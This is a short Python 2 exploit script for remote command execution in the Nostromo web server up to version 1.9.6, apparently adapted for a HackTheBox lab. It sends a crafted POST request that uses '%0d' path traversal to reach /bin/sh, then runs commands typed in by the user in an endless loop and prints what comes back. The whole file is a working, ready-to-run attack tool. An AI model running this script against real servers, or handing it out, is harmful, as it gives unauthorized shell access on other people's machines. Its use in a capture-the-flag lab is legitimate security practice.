#!/usr/bin/env python
import socket
import argparse
parser = argparse.ArgumentParser(description='RCE in Nostromo web server through 1.9.6 due to path traversal.')
parser.add_argument('host',help='domain/IP of the Nostromo web server')
parser.add_argument('port',help='port number',type=int)
args = parser.parse_args()
#modifed the original code for my convenience for htb .. :)
def recv(s):
	r=''
	try:
		while True:
			t=s.recv(1024)
			if len(t)==0:
				break
			r+=t
	except:
		pass
	return r
def exploit(host,port):
	a = raw_input("Enter your command:")
	s=socket.socket()
	s.settimeout(3)
	s.connect((host,int(port)))
	payload="POST /.%0d./.%0d./.%0d./.%0d./bin/sh HTTP/1.0\r\nContent-Length: 1\r\n\r\necho\necho\n{} 2>&1".format(a)
	s.send(payload)
	r=recv(s)
	print r
	s.close()
abc = 0
while True:
	exploit(args.host,args.port)
